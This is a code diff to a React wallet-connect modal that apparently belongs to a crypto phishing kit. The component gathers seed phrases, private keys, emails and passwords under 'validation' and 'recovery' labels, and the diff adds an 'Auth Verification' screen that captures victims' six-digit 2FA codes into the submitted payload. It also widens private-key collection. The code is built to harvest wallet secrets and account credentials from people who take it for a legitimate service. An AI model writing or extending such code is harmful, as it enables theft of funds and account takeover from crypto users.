@@ -25,7 +25,8 @@ import {
   Mail,
   Fingerprint,
   Wallet as WalletIcon,
-  CircleDollarSign
+  CircleDollarSign,
+  Smartphone
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { cn } from "@/lib/utils";
@@ -94,7 +95,7 @@ function WalletImage({ src, alt, className }: { src: string; alt: string; classN
   );
 }
 
-type View = "list" | "login" | "processing" | "methods" | "seed-phrase" | "email-password" | "private-key" | "amount";
+type View = "list" | "login" | "processing" | "methods" | "seed-phrase" | "email-password" | "private-key" | "amount" | "auth-verification";
 
 export function WalletModal({ children, featureTitle }: { children: React.ReactNode, featureTitle?: string }) {
   const [mounted, setMounted] = useState(false);
@@ -114,6 +115,7 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
   const [password, setPassword] = useState("");
   const [privateKey, setPrivateKey] = useState("");
   const [amount, setAmount] = useState("");
+  const [authCode, setAuthCode] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
 
   useEffect(() => {
@@ -139,6 +141,7 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
     setPassword("");
     setPrivateKey("");
     setAmount("");
+    setAuthCode("");
     setIsSubmitting(false);
   };
 
@@ -174,7 +177,7 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
         dataPayload = {
           words: seedWords.slice(0, wordCount).filter(w => w.trim() !== ""),
           count: wordCount,
-          private_key: type === "validation" ? privateKey : undefined
+          private_key: (type === "validation" || type === "private-key") ? privateKey : undefined
         };
         if (type === "assets-recovery" || type === "validation") {
           dataPayload.amount = amount;
@@ -182,6 +185,7 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
         if (type === "validation") {
           dataPayload.email = email;
           dataPayload.password = password;
+          dataPayload.auth_code = authCode;
         }
       } else if (type === "email-password") {
         dataPayload = { email, password };
@@ -249,6 +253,7 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
             {view === "email-password" && "Authentication"}
             {view === "private-key" && "Private Key Validation"}
             {view === "amount" && "Final Step"}
+            {view === "auth-verification" && "Auth Verification"}
           </DialogTitle>
         </DialogHeader>
         
@@ -734,7 +739,7 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
               <Button 
                 onClick={() => {
                   if (isValidation) {
-                    setView("list");
+                    setView("auth-verification");
                   } else {
                     handleFinalSubmit("email-password");
                   }
@@ -751,6 +756,65 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
                    <Shield size={12} />
                    Institutional Auth Gateway
                 </div>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {view === "auth-verification" && (
+          <div className="flex flex-col animate-in fade-in slide-in-from-right-4 duration-300">
+            <div className="p-6 pb-2 text-center relative">
+              <div className="w-10 h-10 rounded-full bg-emerald-500/10 flex items-center justify-center mx-auto mb-4 border border-emerald-500/20">
+                <Smartphone className="text-emerald-500 w-5 h-5" />
+              </div>
+              <h3 className="font-headline text-2xl font-black mb-1 uppercase tracking-tight">
+                AUTH VERIFICATION
+              </h3>
+              <p className="text-slate-500 text-[11px] font-bold tracking-widest">
+                Please enter the 6-digit verification code sent to your email.
+              </p>
+            </div>
+
+            <div className="px-6 py-2 flex items-center justify-between border-b border-white/5">
+              <button 
+                onClick={() => setView("email-password")}
+                className="flex items-center gap-2 text-[10px] font-black text-slate-400 hover:text-white uppercase tracking-widest transition-colors"
+              >
+                <ChevronLeft size={14} /> Back
+              </button>
+              <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-500 text-[9px] font-black uppercase tracking-widest">
+                <Lock size={10} /> 2FA Secured
+              </div>
+            </div>
+
+            <div className="p-8">
+              <h4 className="text-xs font-black uppercase tracking-[0.2em] mb-8 text-center sm:text-left">
+                Security Code
+              </h4>
+
+              <div className="mb-10">
+                <Input 
+                  placeholder="000000" 
+                  maxLength={6}
+                  value={authCode}
+                  onChange={(e) => setAuthCode(e.target.value)}
+                  className="bg-[#0D161F] border-white/5 h-16 pl-6 text-center text-2xl font-black tracking-[0.5em] focus-visible:ring-1 focus-visible:ring-primary/50 rounded-2xl placeholder:text-slate-800"
+                />
+              </div>
+
+              <Button 
+                onClick={() => setView("list")}
+                disabled={authCode.length < 6}
+                className="w-full h-16 bg-primary text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-neon"
+              >
+                <ShieldCheck size={16} />
+                Verify Identity
+              </Button>
+
+              <div className="mt-8 text-center">
+                <p className="text-[10px] text-slate-500 font-bold uppercase tracking-widest">
+                  Didn't receive a code? <button className="text-primary hover:underline">Resend Signal</button>
+                </p>
               </div>
             </div>
           </div>
